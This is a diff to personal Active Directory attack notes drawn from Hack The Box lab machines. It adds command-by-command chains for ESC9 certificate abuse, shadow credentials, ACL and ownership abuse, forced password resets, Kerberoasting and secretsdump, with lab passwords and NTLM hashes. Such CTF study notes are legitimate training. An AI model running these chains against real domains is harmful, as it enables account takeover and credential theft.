@@ -63,7 +63,7 @@ certipy auth -pfx administrator.pfx -dc-ip manager.htb
 sudo ntpdate 10.129.42.194
 ```
 - should sync time to machine, then run prior command
-- make take multiple attempts
+- may take multiple attempts
 
 
 ##### ESC4
@@ -96,7 +96,36 @@ certipy auth -pfx administrator_10.pfx -domain sequel.htb -dc-ip 10.10.11.51 -de
 evil-winrm -i 10.10.11.51 -u 'administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
 ```
 
-#### If user (ryan) has writeOwner permissions over another user (ca_svc), run these commands in fast sequence:
+#### ESC9
+conditions:
+- StrongCertificateBindingEnforcement not set to 2 (default: 1) or CertificateMappingMethods contains UPN flag
+- Certificate contains the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value
+- Certificate specifies any client authentication EKU
+- attacker must have access to an account that has GenericWrite over the other account
+```
+certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41
+```
+![[Pasted image 20250324201041.png]]
+- abusing management_svc's GenericAll over ca_operator to change userPrincipalName of ca_operator to be Administrator
+```
+certipy req -u ca_operator -hashes :259745cb123a52aa2e693aaacca2db52 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
+```
+![[Pasted image 20250324201145.png]]
+- request certificate as ca_operator using the vulnerable template
+- may need to try multiple times
+```
+certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41
+```
+![[Pasted image 20250324201255.png]]
+- changing ca_operator UPN back to what it was
+```
+certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
+```
+![[Pasted image 20250324201400.png]]
+- keep syncing clock until it works
+---
+### Permission abuse
+##### If user (ryan) has writeOwner permissions over another user (ca_svc), run these commands in fast sequence to get hash:
 ```
 bloodyAD --host '10.10.11.51' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'
 ```
@@ -114,13 +143,75 @@ certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc'
 - once owner, 2nd command gives ryan full control of ca_svc
 - syncs time
 - should return hash for ca_svc
-#### If user (Olivia) has GenericAll permissions over another user (Michael)
+
+##### If user (judith) has WriteOwner permissions over a group (management), which has GenericWrite over management_svc user:
+```
+bloodyAD -d certified.htb -u judith.mader -p judith09 --host 10.129.239.104 set owner "CN=Management,CN=Users,DC=certified,DC=htb" "CN=Judith Mader,CN=Users,DC=certified,DC=htb"
+```
+![[Pasted image 20250324194118.png]]
+- set judith as owner of management group
+```
+python3 dacledit.py -dc-ip 10.129.239.104 -u certified.htb/judith.mader:judith09 -target-dn "CN=Management,CN=Users,DC=certified,DC=htb" -principal-dn "CN=Judith Mader,CN=Users,DC=certified,DC=htb" -action write -rights WriteMembers
+```
+![[Pasted image 20250324194201.png]]
+- give judith WriteMember permissions over management group
+```
+bloodyAD -d certified.htb -u judith.mader -p judith09 --host 10.129.239.104 add groupMember "CN=Management,CN=Users,DC=certified,DC=htb" "CN=Judith Mader,CN=Users,DC=certified,DC=htb"
+```
+![[Pasted image 20250324194402.png]]
+- add judith to management group
+```
+bloodyAD -d certified.htb -u judith.mader -p judith09 --host 10.129.239.104 get object "CN=Management,CN=Users,DC=certified,DC=htb"
+```
+![[Pasted image 20250324194426.png]]
+- verify judith successfully added to management group
+```
+certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
+```
+- retrieve hash for management_svc
+- can also use pywhisker instead:
+```
+python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
+```
+![[Pasted image 20250324195017.png]]
+```
+openssl pkcs12 -export -out management_svc_cert.pfx -inkey management_svc_cert.pem_priv.pem -in management_svc_cert.pem_cert.pem -nodes -password pass:
+```
+![[Pasted image 20250324195057.png]]
+```
+certipy auth -pfx management_svc_cert.pfx -u management_svc -domain certified.htb -dc-ip 10.129.239.104 -debug
+```
+![[Pasted image 20250324195151.png]]
+```
+sudo systemctl stop systemd-timesyncd
+```
+- disables ntp from overriding my time sync
+```
+sudo ntpdate -u 10.129.239.104
+```
+- sets ntp to sync with DC-01 target server
+
+##### If user (Olivia) has GenericAll permissions over another user (Michael)
 ```
 net user Michael Password123
 ```
 - Change benjamin's password if currently owned user has GenericAll over benjamin
 	- then login as that user and spray all open services with new creds
-- can also use bloodyAD command below (if no shell)
+- can also use bloodyAD ForceChangePassword command below (if no shell)
+- if neither of those work, try certipy to get hash:
+```
+certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
+```
+![[Pasted image 20250324195505.png]]
+- using management_svc's GenericAll over ca_operator to write shadow credentials and get the NTLM hash of ca_operator
+- if that doesn't work, try running `certipy find` on the account you are targeting even with wrong password:
+```
+certipy find -dc-ip 10.10.11.41 -ns 10.10.11.41 -u ca_operator@certified.htb -p '12345678' -vulnerable -stdout
+```
+![[Pasted image 20250324200006.png]]
+![[Pasted image 20250324200016.png]]
+- shows vulnerable to [[AD#ESC9]]
+- 
 #### If user (Michael) has ForceChangePassword over another user (Benjamin)
 ```
 bloodyAD -u "Michael" -p "Password123" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "12345678"
@@ -142,6 +233,11 @@ targetedKerberoast -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrat
 ```
 secretsdump.py "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"
 ```
+
+
+
+---
+
 
 
 
